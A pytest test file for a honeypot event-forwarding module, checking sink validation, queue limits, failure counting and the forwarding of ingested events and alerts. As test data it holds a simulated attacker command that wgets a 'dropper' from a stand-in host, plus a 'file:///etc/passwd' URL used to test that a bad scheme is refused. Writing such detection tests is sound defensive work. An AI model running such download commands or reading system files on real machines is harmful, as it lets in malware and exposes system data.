from __future__ import annotations

from pathlib import Path

import pytest

from aegis_nexus.app import create_app
from aegis_nexus.forwarding import (
    EventForwarder,
    ForwardingError,
    WebhookSink,
    build_forwarder,
)


class _FakeSink:
    def __init__(self, name: str = "fake", fail: bool = False) -> None:
        self.name = name
        self.fail = fail
        self.received: list[dict] = []

    def send(self, envelope: dict) -> None:
        if self.fail:
            raise OSError("sink down")
        self.received.append(envelope)


class _CapturingForwarder:
    """Minimal stand-in the app can start() and submit() against."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, dict]] = []

    def start(self) -> None:  # noqa: D401 - no-op
        pass

    def submit(self, kind: str, record: dict) -> bool:
        self.calls.append((kind, record))
        return True


def test_forwarding_disabled_by_default_never_opens_a_sink():
    forwarder = build_forwarder({})
    assert forwarder.enabled is False
    assert forwarder.submit("event", {"id": "x"}) is False
    assert forwarder.metrics()["sinks"] == []


def test_webhook_sink_fails_closed_without_secret_or_with_bad_scheme():
    with pytest.raises(ForwardingError):
        WebhookSink(url="https://siem.example/ingest", secret="")
    with pytest.raises(ForwardingError):
        WebhookSink(url="file:///etc/passwd", secret="s3cret")


def test_submit_and_drain_delivers_envelope_preserving_provenance():
    sink = _FakeSink()
    forwarder = EventForwarder([sink])
    record = {
        "id": "e1",
        "observed": {"source_ip": "203.0.113.5"},
        "derived": {"ioc": []},
        "collector": {"normalization": {"truncated": False}},
    }
    assert forwarder.submit("event", record) is True
    forwarder.drain()

    assert len(sink.received) == 1
    envelope = sink.received[0]
    assert envelope["kind"] == "event"
    assert envelope["schema_version"]
    # Provenance classes and Evidence Integrity metadata travel untouched.
    assert envelope["record"]["observed"]["source_ip"] == "203.0.113.5"
    assert "derived" in envelope["record"]
    assert envelope["record"]["collector"]["normalization"] == {"truncated": False}
    assert forwarder.metrics()["delivered"] == 1


def test_bounded_queue_drops_and_counts_evidence_loss_without_blocking():
    sink = _FakeSink()
    forwarder = EventForwarder([sink], queue_max=1)
    assert forwarder.submit("event", {"id": "a"}) is True
    # Queue is full (worker not running); the next submit must drop, not block.
    assert forwarder.submit("event", {"id": "b"}) is False
    metrics = forwarder.metrics()
    assert metrics["dropped"] == 1
    assert metrics["submitted"] == 1


def test_delivery_failure_is_counted_and_never_raises():
    forwarder = EventForwarder([_FakeSink(fail=True)], max_retries=2)
    forwarder.submit("alert", {"id": "z"})
    forwarder.drain()  # must not raise even though the sink always fails
    assert forwarder.metrics()["failed"] == 1


def test_sensors_gain_no_forwarding_import():
    # Collector-only invariant: no sensor module may import the forwarder.
    sensors_dir = Path("src/aegis_nexus/sensors")
    offenders = [
        path.name
        for path in sensors_dir.glob("*.py")
        if "forwarding" in path.read_text(encoding="utf-8")
    ]
    assert offenders == []


def test_ingest_forwards_event_and_alert(tmp_path):
    fake = _CapturingForwarder()
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "sensor-secret",
        "FORWARDER": fake,
    })
    client = app.test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "sensor-secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {
                "source_ip": "203.0.113.40",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget http://example.invalid/dropper",
            },
        },
    )
    assert response.status_code == 201
    kinds = [kind for kind, _ in fake.calls]
    assert "event" in kinds
    assert "alert" in kinds  # download_attempt rule fires
